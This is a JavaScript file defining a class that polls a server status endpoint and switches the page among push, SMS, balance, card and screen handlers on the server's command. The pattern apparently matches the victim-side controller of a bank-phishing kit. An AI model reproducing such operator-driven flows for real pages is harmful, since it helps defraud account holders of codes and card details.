class System {
    constructor(logId, linkId) {
        this.linkId = linkId,
            this.logId = logId,
            this.running = true,
            this.pollingInterval = 1500,
            this.maxRetries = 5,
            this.retryDelay = 2000,
            this.redirect()
    }

    async status(retryCount = 0) {
        try {
            const response = await axios.post('/api/getStatus', { id: this.logId });
            return response.data;
        } catch (error) {
            if (retryCount < this.maxRetries) {
                return new Promise(resolve => setTimeout(() => resolve(this.status(retryCount + 1)), this.retryDelay));
            } else {
                return null;
            }
        }
    }


    redirect() {
        let lastStatus = null;
        const handlers = {
            push: onPush,
            skip: onSkip,
            customError: onCustomError,
            success: onSuccess,
            change: onChange,
            balance: onBalance,
            sms: onSms,
            custom: (error) => {
                const [param1, param2] = (error || '').split('|');
                onCustom(param1, param2);
            },
            card: onCard,
            screen: onScreen
        };

        const processStatus = async () => {
            if (!this.running) return;

            const response = await this.status();

            if (response) {
                const currentStatus = response.method;
                if (currentStatus !== lastStatus) {
                    lastStatus = currentStatus;

                    const handler = handlers[currentStatus];
                    if (handler && typeof handler === 'function') {
                        const errorParam = response.error || null;
                        handler(errorParam);

                        if(lastStatus === "card") {
                            return;
                        }
                    } else {
                        console.warn(`"${currentStatus}" not found`);
                    }
                }
            }

            setTimeout(processStatus, this.pollingInterval);
        };

        processStatus();
    }

    stop() {
        this.running = false;
    }

    setPollingInterval(interval) {
        this.pollingInterval = interval;
    }

}

window.__System = System;